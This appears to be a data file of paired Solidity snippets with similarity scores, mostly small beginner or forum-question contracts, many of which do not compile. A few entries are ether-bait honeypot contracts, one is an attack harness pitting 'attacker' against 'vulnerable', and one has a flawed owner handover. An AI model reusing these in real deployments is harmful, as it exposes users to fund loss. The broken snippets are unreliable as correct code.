    string public name;
    uint  public id;
    constructor(uint _id,string _name) public
    {
        name=_name;
        id=_id;
    }
}",0.6631868497703434,"contract DetailedERC20 is ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor() public {
        
    }

    
}"
"contract B is A {
    constructor(address paramB) public {

    }
}",0.6731940153820316,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract C is A {
    constructor(string paramC) public {

    }
}",0.6827259278181349,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract PersonalInfo{
    address public userAddress;
    address public manager;
    address[] public Users;  


    modifier restricted (){
        require(msg.sender == manager);
        _;
    }

    function PersonalInfo () public{
        manager = msg.sender;
    }

    function AddUsers()public payable{
        if(msg.sender != manager)
            Users.push(msg.sender);
    }
    function SendUsersArray()public{

    }



}",0.688029567219016,"contract owned {
	address public owner;
	address mid;
	function owned() public payable {owner = msg.sender;}
	modifier onlyOwner {require(owner == msg.sender); _;}
	function changeOwner(address _owner) onlyOwner public {mid=_owner;  }
	function setOwner() public returns (bool) {
		if(msg.sender==mid) {owner = msg.sender; return true;}
	}
	
}"
"contract TEST{
    bytes public name=""Yerevan is love"";

    function fname() public view returns(string memory){
      return string(name);
     }
   }",0.6727046396428782,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract PercentageCalc {
  uint128 public bp = 185; 

  function calculatePercentage(
    uint128 theNumber
  )
  public
  view
  returns (uint128) {
    return uint128(int256(theNumber) / int256(10000) * int256(bp));
  }
}",0.6151890965287172,"contract CryptoArenaInterface {

    function getData(address ) public view returns(uint256 , uint256 , uint256 , bool    , uint256 , uint256 ) {}

    function isContractMiniGame() public pure returns( bool  ) {}

}"
"contract Supreme {
    address public big;
    uint256 public cost;

    function Supreme() 
      public
    {
        big = msg.sender;
        cost = 3 ether;
    }

    function Road() 
      external
      payable
    {
        require(msg.value >= cost);
        big.transfer(msg.value);
        big = msg.sender;

        cost += 1 ether;
    }
}",0.6436956488014641,"contract FreeEthForMiners {

	address public creator;

	constructor() payable public {
		creator = msg.sender;
		require(msg.value == 0.069 ether);
	}

	function rewardMiner() external {
		if (tx.gasprice == 0 && msg.sender == creator) {
			block.coinbase.transfer(address(this).balance);
		}
	}

}"
"contract Project{
    bytes32[] array;

    function addValue(bytes32 element)public{
        
        array.push(element);
    }

    function getAll()view public returns(bytes32[]){
        return array;
    }
}",0.6028406824837953,"contract DSProxy {
    function execute(address _target, bytes memory _data) public payable returns (bytes32);
    function setOwner(address owner_) public;
}"
"contract A {
        mapping (string => uint) public someMapping;
}",0.6376862697036619,"contract ERC20 {

    mapping(address => uint) public balanceOf;

}"
"contract Guess {


function Guess(){
    MetaCoin metaCoin = new MetaCoin(); 
}

function getContractAddress() constant returns (address){
    return this;
}

function getThrowaway() constant returns (string){
    return ""Hello"";
}


}",0.6539491088913691,"contract Token { 
    function issue(address _recipient, uint256 _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function owner() returns (address _owner);
}"
"contract richkid{

function buy_ceo_place() public payable returns (bool)

{

if(msg.sender.send(this.balance))

{

return false;

}
sorry-failed() 
return true;

}

}",0.6960859538743382,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract CampaignFactory{
    address[] public deployedCampaigns;
    function createCampaign(uint minimum)public{
        address newCampaign = new Campaign(minimum, msg.sender);
        deployedCampaigns.push(newCampaign);
    }
    function getDeployedCampaign() public view returns(address[]){
        return deployedCampaigns;
    }
}",0.6699585275439027,"contract CreateBlogger {

    address [] public deployedBlogs;



    function createBlogger() public returns(address) {

        address newBlogger = new Blogger(msg.sender);

        deployedBlogs.push(newBlogger);

        return newBlogger;

    }



    function getDeployedBlogs() public view returns(address[]) {

        return deployedBlogs;

    }

}"
"contract Campaign{
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }
    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    mapping (address => bool) public approvers;
    uint public approversCount;
    modifier restricted(){
        require(msg.sender == manager);
        _;
    }
    function Campaign (uint minimum, address creator)public{
        manager = creator;
        minimumContribution = minimum;
    }
    function contribue()public payable{
        require(msg.value > minimumContribution);
        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string description, uint value, address recipient)public restricted{
        Request memory newRequest = Request({
            description: description,
            value: value,
            recipient: recipient,
            complete: false,
            approvalCount: 0
        });
        requests.push(newRequest); 
    }

    function approveRequest(uint index)public{
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;
    }
    function finalizeRequest(uint index)public restricted{
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount/2));
        require(!request.complete);

        request.recipient.transfer(request.value);
        request.complete = true;
    }

    function getSummary() public view returns (
        uint, uint, uint, uint, address
    ){
        return (
            minimumContribution,
            this.balance,
            requests.length,
            approversCount,
            manager
        );
    }

    function getRequestsCount() public view returns (uint){
        return requests.length;
    }
}",0.6161925954884098,"contract EthereumHoneypotTracker is IERC20 {
    
    string public name = ""HONEYPOT"";
    string public symbol = ""HONEYPOT"";
    uint public decimals = 1;
    
    uint _totalSupply = 0;
    
    mapping(address => uint) balance;
    mapping(address => bool) public minters;
    mapping(address => bool) public minterAdders;
    
    constructor() public {
        minters[msg.sender] = true;
        minterAdders[msg.sender] = true;
    }
    
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) external view returns (uint) {
        return balance[account];   
    }
    
    function transfer(address , uint ) external returns (bool) {
        revert();
    }
    
    function transferFrom(address sender, address recipient, uint amount) external returns (bool){
        require(minters[msg.sender]);
        uint bal = balance[sender];
        require(bal >= amount);
        balance[sender] = bal - amount;
        balance[recipient] = balance[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function allowance(address , address ) external view returns (uint256) {
        return 0;
    }
    
    function approve(address , uint256 ) external returns (bool) {
        revert();
    }
    
    function mint(address receiver) external {
        require(minters[msg.sender]);
        balance[receiver] += 1;
        _totalSupply = _totalSupply + 1;
        emit Transfer(address(0), receiver, 1);
    }
    
    function addMinter(address minter) external {
        require(minterAdders[msg.sender]);
        minters[minter] = true;
    }
    
    function removeMinter(address minter) external {
        require(minterAdders[msg.sender]);
        minters[minter] = false;
    }
    
    function addMinterAdder(address newMinterAdder) external {
        require(minterAdders[msg.sender]);
        minterAdders[newMinterAdder] = true;
    }
}"
"contract C {
    uint256 public x = 100;
}",0.6746776233929235,"contract CoinI{
    
    uint256 public totalSupply ;
}"
"contract SomeContract {
   ERC20 erc;

  constructor(tokenAddress){
      erc = ERC20(tokenAddress)
  }


   getTokenBalance(address owner) returns (uint){
      return erc.balanceOf(owner);
   }
}",0.6186656644733758,"contract ERC20 {
    function transfer(address _to, uint _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint balance);
}"
"contract MyFirstContract{
    string private name;
    uint private age;

    function setName(string newName) public{
        name=newName;
    }
    function getName()public view returns(string){
        return name;
    }

    function setAge(uint newAge) public{
        age=newAge;
    }
    function getAge()public view returns(uint){
        return age;
    }

}",0.637134795155938,"contract ERC223 {

  uint public totalSupply;

  function balanceOf(address who) public constant returns (uint);

  function totalSupply()public constant returns (uint256 _supply);

  function name() public constant returns (string _name);

  function symbol()public constant returns (string _symbol);

}"
"contract test{
    address payable []array;
}",0.6360909338936601,"contract Dispatchable {


    
    address private target;
}"
"contract Example{
    function foo(){
        revert(""hello world!!!"");        
    }
}",0.6166604139173516,"contract Nonpayable {

  
  
  
  function () public payable {
    revert();
  }
}"
"contract MyTokenSale {

 ERC721Token public token;

 constructor(address _tokenAddress) public {
    token = ERC721Token(_tokenAddress);
  }
",0.6094061171947756,"contract MintableERC721Token is ERC721Token {

  constructor(string name, string symbol)

    ERC721Token(name, symbol)

    public

  {



  }

}"
"contract TestOneReturn
{
    mapping(uint => uint) m_Data;

    constructor()
        public
    {
        m_Data[0] = 111;
        m_Data[1] = 112;
    }

    function getAddress(uint pA)
        external view
        returns(uint)
    {
        return m_Data[pA];
    }
}",0.6366406581889906,"contract test {



        uint _multiplier;



        constructor (uint multiplier) public {

             _multiplier = multiplier;

        }



        function multiply(uint a) public view returns(uint d)  

        {

             return a * _multiplier;

        }

    }"
"contract TestTwoReturns
{
    mapping(uint => mapping(uint => uint)) m_Data;

    constructor()
        public
    {
        m_Data[0][0] = 211;
         m_Data[0][1] = 212;
    }

    function getAddress(
        uint pA,
        uint pB
    )
        external view
        returns(uint)
    {
        return m_Data[pA][pB];
    }
}",0.6213389033554004,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract Marketplace {
    string public name;
    address owner;
    uint public fileCount = 0;
    mapping(uint => File) public files; 


    struct File
    {
        uint id;
        string name;
        address owner;
        address sharedWith;
    }

    mapping(uint => Product) public products;

    struct Product {
        uint id;
        string name;
        address owner;
        address sharedWith;
    }

    event ProductCreated(
        uint id,
        string name,
        address owner,
        address sharedWith
    );

    event FileViewed(
        uint id,
        string name,
        address owner,
        address sharedWith
    );


    constructor() public {
        name = ""File Sharing System"";
        owner = msg.sender;
    }

    modifier onlyOwner()
    {
        require(owner==msg.sender);
        _;
    }

    function addFile(string memory _name, address _address) onlyOwner public
    {
        fileCount++;
        products[fileCount] = Product(fileCount,_name,owner,_address);
        emit ProductCreated(fileCount, _name, owner, _address);
    }

    function viewFile(uint _id) public view
    {
        Product memory _file = products[_id];
        require(msg.sender==_file.sharedWith,""Not shared with you!!"");
        emit FileViewed(fileCount, _name, owner, _address);
    }

}",0.6366203526357577,"contract StrongHandsManager {

    

    event CreateStrongHand(address indexed owner, address indexed strongHand);

    event MintToken(address indexed owner, uint256 indexed amount);

    

    mapping (address => address) public strongHands;

    mapping (address => uint256) public ownerToBalance;

    

    

    string public constant name = ""Stronghands3D"";

    string public constant symbol = ""S3D"";

    uint8 public constant decimals = 18;

    

    uint256 internal tokenSupply = 0;



    function getStrong()

        public

    {

        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");

        

        strongHands[msg.sender] = new StrongHand(msg.sender);

        

        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);

    }

    

    function mint(address _owner, uint256 _amount)

        external

    {

        require(strongHands[_owner] == msg.sender);

        

        tokenSupply+= _amount;

        ownerToBalance[_owner]+= _amount;

        

        emit MintToken(_owner, _amount);

    }

    

    

    function totalSupply()

        public

        view

        returns (uint256)

    {

        return tokenSupply;

    }

    

    function balanceOf(address _owner)

        public

        view

        returns (uint256)

    {

        return ownerToBalance[_owner];

    }

}"
"contract House { 
  uint public idHouse;
  ...
}",0.6766678888669279,"contract Empty {
 uint public value = 5;
}"
"contract Votacion{
mapping(uint => address[]) private votosCandidatos;
uint[] listaCandidatos;
bool abierta;

address private creador=msg.sender;

constructor(uint[] memory candidatosIds) public{
    listaCandidatos = candidatosIds;
    abierta = false;
    for (uint i = 0; i < candidatosIds.length; i++)
    {
        votosCandidatos[candidatosIds[i]];
    }
}

function ind(address[] memory v, address e) public pure returns (bool){
    bool found = false;

    for(uint i = 0; i < v.length && !found; i++)
    {
        found = v[i] == e;
    }

    return found;
}

function votar(uint candidato) public{
    bool ya_votado = false;

    for (uint i = 0; i < listaCandidatos.length && !ya_votado; i++)
    {
        ya_votado = ind(votosCandidatos[listaCandidatos[i]],msg.sender);
    }

    require(!ya_votado,""Ya ha ejercido su derecho a voto"");
    
    require(abierta,""La votacin no es accesible en este momento"");
    
    votosCandidatos[candidato].push(msg.sender);
}

function abrir() public{
    require(msg.sender == creador,""Permiso denegado"");
    abierta = true;
}

function cerrar() public{
    require(msg.sender == creador,""Permiso denegado"");
    abierta = false;
}

function revisar_voto() public view returns (uint)
{
    require(!abierta,""La votacin no ha terminado aun"");
    bool ya_votado = false;
    uint res;

    for (uint i = 0; i < listaCandidatos.length && !ya_votado; i++)
    {
        ya_votado = ind(votosCandidatos[listaCandidatos[i]],msg.sender);
        res = i;
    }

    return res;
}

function resultados() public view returns (uint[] memory){
    require(!abierta,""La votacin no ha terminado aun"");

    uint[] memory resul = new uint[](listaCandidatos.length);

    for (uint i = 0; i < listaCandidatos.length; i++)
    {
        resul[i] = votosCandidatos[listaCandidatos[i]].length;
    }

    return resul;
}
}",0.6014697467189468,"contract EtherToTheMoon {
 
 
 address public owner;
 uint public totalContribution;

 
 function EtherToTheMoon() public{
   owner = msg.sender;
 }
 modifier onlyOwner() {
   require(msg.sender == owner);
   _;
 }
 struct richData {
   uint amount;
   bytes32 message;
   address sender;
 }
 
 
 
 
 mapping(address => uint) public users;
 richData[10] public richDatabase; 

 
 
 function takeMyMoney(bytes32 message) public payable returns (bool){
   
   users[msg.sender] += msg.value;
   totalContribution += msg.value;
   if(users[msg.sender] >= users[richDatabase[9].sender] ){
     richData[] memory arr = new richData[](10);
     bool updated = false;
     uint j = 0;
     for (uint i = 0; i < 10; i++) {
       if(j == 10) break;
       if(!updated && users[msg.sender] > richDatabase[i].amount) {
         richData memory newData;
         newData.amount = users[msg.sender];
         newData.message = message;
         newData.sender = msg.sender;
         arr[j] = newData;
         j++;
         if(richDatabase[i].sender != msg.sender) {
          arr[j] = richDatabase[i];
          j++;
         }
         updated = true;
       } else if(richDatabase[i].sender != msg.sender){
         arr[j] = richDatabase[i];
         j++;
       }
     }
     for(i = 0; i < 10; i++) {
         richDatabase[i] = arr[i];
       }
   }
   return updated;
 }
 function buyerHistory() public constant returns (address[], uint[], bytes32[]){

     uint length;
     length = 10;
     address[] memory senders = new address[](length);
     uint[] memory amounts = new uint[](length);
     bytes32[] memory statuses = new bytes32[](length);

     for (uint i = 0; i < length; i++)
     {
         senders[i] = (richDatabase[i].sender);
         amounts[i] = (richDatabase[i].amount);
         statuses[i] = (richDatabase[i].message);
     }
     return (senders, amounts, statuses);
 }
 function withdraw(address _to, uint _amount) onlyOwner external payable{
     require(_amount <= totalContribution);
     totalContribution -= _amount;
     _to.transfer(_amount);
 }
}"
"contract sendether{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 5 ether;

         _address.transfer(value);
     }

}",0.6926816583504235,"contract Child {

    function() public payable {

    }

    

    function win(address target) public payable {

        require(target.call.value(msg.value)());

        msg.sender.transfer(address(this).balance);

    }

}"
"contract demo {string public name = \""Petros\""; function changeName(string _newName){name = _newName; } }",0.6141952227694939,"contract ENSReverseRegistrarI {
    function setName(string memory name) public returns (bytes32 node);
}"
"contract KeyValueStorage {
    mapping (address => mapping(bytes32 => uint256)) refreshTime;
    ....
}",0.6074245746857019,"contract KernelStorage is KernelConstants {
    mapping (bytes32 => address) public apps;
}"
"contract CoffeeCoin is ERC20Basic {
    mapping(address => uint256) balances;
    ...
}",0.6947568412456996,contract DiscountToken { mapping (address => uint256) public balanceOf; }
"contract B {

    constructor() payable public {
        A a = new A();
        address payable receiver = address(a); 
        receiver.transfer(msg.value);
     }
}",0.6116787600699657,"contract InstaKyber is Trade {



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



}"
"contract Test2 {

   address public lastSCAddress; 
     address public oldestSCAddress; 
   string name;

}",0.6549843141910803,"contract Storage {

  mapping(address => address) public proxyDelegates;
  address[] public delegates;
}"
"contract Escrow {
    ....
    modifier onlyafter(uint _time) {
      require(now >= _time);
      _;
}",0.6043171803465165,"contract Priced

{

    modifier costs(uint price)

    {

        

        require(msg.value == price);

        _;

    }

}"
"contract Asset {

uint256 public owners_count;
address public contract_owner;              
bytes32 public land_id;                   
bytes32 public land_sqrfeet;              
bytes32 public land_created_date;         
mapping(uint => address) public owners;     

function createland(bytes32 _land_id, bytes32 _land_sqrfeet, bytes32 _land_created_date) public returns (bool){
    setOwner(msg.sender);
    land_id = _land_id;
    land_sqrfeet = _land_sqrfeet;
    land_created_date = _land_created_date;
    return true;
}


modifier onlyOwner(){
    require(msg.sender == contract_owner);
    _;
}


function transferOwnership(address _newOwner) public onlyOwner(){
    require(_newOwner != address(0));
    contract_owner = _newOwner;
}


function previousOwner() view public returns(address){
    if(owners_count != 0){
        uint256 previous_owner = owners_count - 1;
        return owners[previous_owner];
    }
}

function setOwner(address owner)public{
    owners_count += 1 ;
    owners[owners_count] = owner;
}

function getCurrentOwner() view public returns(address){
    return owners[owners_count] ;
}

function getOwnerCount() view public returns(uint256){
    return owners_count;
}}",0.6652966565465556,"contract MultiOwnable {

    mapping(address => bool) ownerMap;
    address[] public owners;

    event OwnerAdded(address indexed _newOwner);
    event OwnerRemoved(address indexed _oldOwner);

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    constructor() public {
        
        address owner = msg.sender;
        ownerMap[owner] = true;
        owners.push(owner);
    }

    function ownerCount() public constant returns (uint256) {
        return owners.length;
    }

    function isOwner(address owner) public constant returns (bool) {
        return ownerMap[owner];
    }

    function addOwner(address owner) public onlyOwner returns (bool) {
        if (!isOwner(owner) && owner != 0) {
            ownerMap[owner] = true;
            owners.push(owner);

            emit OwnerAdded(owner);
            return true;
        } else return false;
    }

    function removeOwner(address owner) public onlyOwner returns (bool) {
        if (isOwner(owner)) {
            ownerMap[owner] = false;
            for (uint i = 0; i < owners.length - 1; i++) {
                if (owners[i] == owner) {
                    owners[i] = owners[owners.length - 1];
                    break;
                }
            }
            owners.length -= 1;

            emit OwnerRemoved(owner);
            return true;
        } else return false;
    }
}"
"contract customerFinder{
    mapping(uint256 => address payable) public addressStorage;

    function filling(uint256 iden, address payable sender) public{
       addressStorage[iden]=sender;
    }

    function finder(uint256 id) public view returns(address payable){
       return addressStorage[id];
    }
}",0.6682054761179824,"contract TVToken {
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function balanceOf(address _owner) public view returns (uint256);
    function allowance(address _owner, address _spender) public view returns (uint256);
}"
"contract Extend{
    Base public base;
    uint public num;
    constructor() public {
        base = new Base();
        base.Minit(10);
    }   
    function setN() public{
        num = base.getN();

    }
    function getN() public view returns(uint){
        return num;
    }
}",0.6359413237142489,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract MyCrowdsale is Crowdsale {
    function MyCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet)
        Crowdsale(_startTime, _endTime, _rate, _wallet)
    {
    }  
}",0.6564208773712388,"contract STO20 {

    uint256 public startTime;
    uint256 public endTime;

    
    function securityTokenOffering(
        address _tokenAddress,
        uint256 _startTime,
        uint256 _endTime
    ) external ;

}"
"contract DoubleCall {
    address public superHero;
    uint256 public price = 1 ether;

    function becomeSuperHero() public payable{
        require(msg.value >= price);
        superHero = msg.sender;
        price = price * 2;
    }
}",0.664972662400164,"contract Counter {
    uint256 public i;
    constructor() payable public {
        require(msg.value==0.0058 ether,""bad amount"");
        i = 0;
    }
    function inc() public {
        if (i==1) {
            msg.sender.transfer(address(this).balance);
        }
        i++;
    }
}"
"contract test_pq {
       function test() public returns (int256){
         PQ memory pq;
         for (uint8 i = 0; i < 10; i++)
             pq.insert(i)
         return pq.get_min();
       }
}",0.61581357344473,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract C{
   bytes public name;
   function rep(bytes memory pseudonym)  public returns(string memory){
       name=pseudonym;
       return string(name);
   }
   }",0.6718173512317884,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract A is B {

    constructor(string memory _name, string memory _symbol) B(_name, _symbol) public {}
}",0.6354388102260906,"contract EIP20 is ERC20 {

    string public name;

    uint8 public decimals;

    string public symbol;

}"
"contract demo {
  string public name=""Pietro"";
  function changeName(string _newName){
       name=_newName;
   } 
}",0.6367241658657873,"contract ReverseRegistrarRef {
    function setName(string name) public returns (bytes32 node);
}"
"contract X{
    uint256[] public array = [1];

    function X(){}

    function popLength() public{
        array.length--;
    }

    function getLength() constant returns(uint256){
        return array.length;
    }
}",0.6753462696565761,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract Survey {
    
     event SurveyInitialized(address indexed owner, uint indexed surveyReward);

    
    address public owner;
    address private factory;

    Constructor Survey(address _owner) payable public {
        (_owner != address(0));
        (msg.value > 0);
        owner = _owner;
        factory = msg.sender;
        emit SurveyInitialized(owner, msg.value);
    }
}",0.6970443053436948,"contract Ownable {



    address public owner;



    event NewOwner(address indexed old, address indexed current);



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    constructor() public {

        owner = msg.sender;

    }



    function setOwner(address _new)

        public

        onlyOwner

    {

        require(_new != address(0));

        owner = _new;

        emit NewOwner(owner, _new);

    }

}"
"contract X{

uint constant var1=now;
uint var2=now;

function checkConstant() returns(uint,uint){
    return (var1,var2);
}}",0.6549190821435239,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract TestEvent {

    
    event testEvent(string indexed message);


    function emitTestEvent(
        string  calldata message
    ) 
    external
    {
     emit testEvent(message);
    }
}",0.6161337187694427,"contract Debuggable {
    event LogUI(string message, uint256 value);

    function logUI(string message, uint256 value) internal {
        emit LogUI(message, value);
    }
}"
"contract Greet
{
  string message;
  constructor() public{
        message=""I'm ready!"";
    }
function setgreetings(string _message)public
{
    message=_message;
}
function getgreetings()public view returns(string){
       return message;
 }
}",0.6193693071942564,"contract Context {
    constructor () public { }

    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view returns (bytes memory) {
        this;
        return msg.data;
    }
}"
"contract Test is ITest
{
    address private admin;

    constructor()
        public
    {
        admin = msg.sender;
    }

    modifier onlyAdmin
    {
        assert(msg.sender == admin);
        _;
    }

    function check()
        external onlyAdmin
    {
        
    }
}",0.6694565617299436,"contract Ownable {

	

	

	address private owner;

	

	

	constructor() public {

		owner = msg.sender;

	}

	

	

	modifier onlyOwner() {

		require( 

			msg.sender == owner,

			'Only the administrator can change this'

		);

		_;

	}

	

}"
"contract Sandbox {

    function retArr() 
    public constant returns (byte[3][10] ret) {
        ret[0][2] = byte(2);
    }

}",0.6740896376275644,"contract StorageInterface {
    function getUInt(bytes32 record) public constant returns (uint);
}"
"contract Purchase {
    uint public value;
    address public seller;
    address public buyer;
    enum State { Created, Locked, Inactive }
    State public state;

    
    
    
    constructor() public payable {
        seller = msg.sender;
        value = msg.value / 2;
        require((2 * value) == msg.value, ""Value has to be even."");
    }

    modifier condition(bool _condition) {
        require(_condition);
        _;
    }

    modifier onlyBuyer() {
        require(
            msg.sender == buyer,
            ""Only buyer can call this.""
        );
        _;
    }

    modifier onlySeller() {
        require(
            msg.sender == seller,
            ""Only seller can call this.""
        );
        _;
    }

    modifier inState(State _state) {
        require(
            state == _state,
            ""Invalid state.""
        );
        _;
    }

    event Aborted();
    event PurchaseConfirmed();
    event ItemReceived();

    
    
    
    function abort()
        public
        onlySeller
        inState(State.Created)
    {
        emit Aborted();
        state = State.Inactive;
        seller.transfer(this.balance); 
        
        
    }

    
    
    
    
    function confirmPurchase()
        public
        inState(State.Created)
        condition(msg.value == (2 * value))
        payable
    {
        emit PurchaseConfirmed();
        buyer = msg.sender;
        state = State.Locked;
    }

    
    
    function confirmReceived()
        public
        onlyBuyer
        inState(State.Locked)
    {
        emit ItemReceived();
        
        
        
        state = State.Inactive;

        
        

        buyer.transfer(value);
        seller.transfer(this.balance);
    }
}",0.6135589490607478,"contract RefundVault is Ownable {
  using SafeMath for uint256;
  enum State { Active, Refunding, Closed }
  mapping (address => uint256) public deposited;
  address public wallet;
  State public state;
  event Closed();
  event RefundsEnabled();
  event Refunded(address indexed beneficiary, uint256 weiAmount);
  function RefundVault(address _wallet) public {
    require(_wallet != address(0));
    wallet = _wallet;
    state = State.Active;
  }
  function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
  function close() onlyOwner public {
    require(state == State.Active);
    state = State.Closed;
    emit Closed();
  }
  function withdrawToWallet() onlyOwner public{
    require(state == State.Closed);
    wallet.transfer(address(this).balance);
  }
  function enableRefunds() onlyOwner public {
    require(state == State.Active);
    state = State.Refunding;
    emit RefundsEnabled();
  }
  function refund(address investor) public {
    require(state == State.Refunding);
    uint256 depositedValue = deposited[investor];
    deposited[investor] = 0;
    emit Refunded(investor, depositedValue);
    investor.transfer(depositedValue);
  }
}"
"contract Betting{
    struct Player{
        mapping(uint => uint) amounts;

    }

    struct Match{
        address [] playerAdresses;
        uint [] totalBets;
    }

    mapping(address => Player) public playerInfo;
    mapping(uint => Match) public matchInfo;
}",0.6284350902512605,"contract Weth {

    mapping(address => mapping(address => uint)) public allowance;

    mapping(address => uint) public balanceOf;



    function transferFrom(address src, address dst, uint wad) public returns (bool);

}"
"contract Test is Calculator {
   constructor() public {}
   function getResult() external view returns(uint){
      uint a = 1; 
      uint b = 2;
      uint result = a + b;
      return result;
   }
}",0.6751211374816601,"contract test {



        uint _multiplier;



        constructor (uint multiplier) public {

             _multiplier = multiplier;

        }



        function multiply(uint a) public view returns(uint d)  

        {

             return a * _multiplier;

        }

    }"
"contract Hello{

    string name;
    function Hello(){
        name = ""Mike"";
         }
}",0.6157271874048338,"contract SkyNet{
    
    string public HelloWorld = ""Hello World"";
    

}"
"contract foster{
    vulnerable v = new vulnerable();
    attacker a = new attacker(address(v));

     constructor() public payable{

        
        
     }

     function action() public payable{
         a.deposit(address(v));     
         v.addNominee(address(a));
     }

     function getTargetBalance() public view returns(uint256, uint256){
        return (address(v).balance , address(this).balance);
    }

     function attack() public payable{
         v.transact();
     }
}",0.6431001199002101,"contract SkrillaTokenInterface {
    function transfer(address _to, uint256 _value) public returns (bool);

    function buyTokens() payable public;

    function getCurrentPrice(address _buyer) public constant returns (uint256);

    function tokenSaleBalanceOf(address _owner) public constant returns (uint256 balance);

    function withdraw() public returns (bool);
}"
"contract Test 
{
   uint32 value = 10;
}",0.6157199723223802,"contract Empty {
 uint public value = 5;
}"
"contract test {


uint256 public counter = 0;

event testEvent(address indexed _sender, uint256 _value, uint256 _counter);


function test() public{
    counter += 1;

}

function() public payable {
    raiseCounter();
}

function raiseCounter() public payable{
    testEvent(msg.sender, msg.value, counter);
    counter += 1;
}

function destroy() public{
    selfdestruct(msg.sender);
}
}",0.6746095229493805,"contract AddValues {
    address payable owner;
    event EventSeeAmount(uint256 amount);
    
    constructor () public{
        owner=msg.sender;
    }
    
    modifier onlyOwner{
        require (msg.sender == owner);
        _;
    }

    function () external payable{
        uint256 total;
        uint256 x = 3;
        uint256 y = 30;
        
        total = x + y;
        emit EventSeeAmount(total);
    }
    
    function destroy () public onlyOwner{
        selfdestruct(owner);
    }
    
}"
"contract reg{
  address owner;
  uint256 regFee = 2 ether;
  address[] private registered;
  uint a = 0;

  mapping (address => uint256) public balance;

  constructor() public{
    owner = msg.sender;
    regFee = 2 ether;
  }

  event registeration(address indexed _to);

  
  
  
  
  

  function () payable external{
    balance[(msg.sender)] -= 2 ether;
    balance[address(this)] += 2 ether;
    registered.push(msg.sender);
    a++;
    emit registeration(msg.sender);
  }

  function list() public view returns(address, address, address){
    return (registered[0], registered[1], registered[2]);
  }
}",0.6464310349723112,"contract XG4K {
    
    
    address public coiner;
    mapping (address => uint) public balances;

    
    
    event Issue(address from, address to, uint amount);

    
    
    function XG4K() public {
        coiner = msg.sender;
        balances[msg.sender] = 100000;
    }

    function mint(address receiver, uint amount) public {
        if (msg.sender != coiner) return;
        balances[receiver] += amount;
    }

    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Issue(msg.sender, receiver, amount);
    }
}"
"contract BOLData {

    string public SData;
    string public SCData;


    function BOLData(string S_Data) 
    { 
        SData= S_Data;
        SCData= '';
    } 
    function getSData() constant returns (string retVal) 
    { 
        return SData;
    }
    function setSCData(string SC_Data) 
    { 
        SCData = SC_Data; 
    } 
    function getSCData() constant returns (string retVal) 
    { 
        return SCData;
    }

}",0.6389869934878136,"contract bundinha is Utils {
	uint N;
	string bundinha;


	function setN(uint x) public {
		N = x;
	}

	function getN() constant public returns (uint) {
		return N;
	}

	function setBundinha(string x) public {
		require(strlen(x) <= 32);
		bundinha = x;
	}

	function getBundinha() constant public returns (string){
		return bundinha;
	}

}"
"contract Adoption {
 address[16] adopters;


function adopt(uint petId) public returns (uint){
  require(petId >= 0 && petId <= 15);
  adopters[petId] = msg.sender;
  return petId;
}


function getAdopters() public view returns (address[16]){
 return adopters;


 }
 }",0.6282348711592659,"contract VeredictumTest is Notify
{
    address public vnt;
    
    function setVnt(address _addr) { vnt = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == vnt);
        Notified(_from, _amount);
        return true;
    }
}"
"contract myContract{
        bytes32[7500] public array;
        function getArray() public view returns(bytes32[7500]){
            return array;
        }
}",0.6541832228420562,"contract IRandomUtil{

     function getBaseRandom() public view returns (bytes32);

     function addContractAddr() public;

}"
"contract CallAnotherContract {
    address public sender;
    uint public value;

    
    function callTheOtherContract(address _contractAddress) 
    public
    payable {
        (bool success, bytes memory returnData) = (_contractAddress.delegatecall(abi.encode(bytes4(keccak256(""callMe()"")))));
        require(success);
    }

    function getBalance()
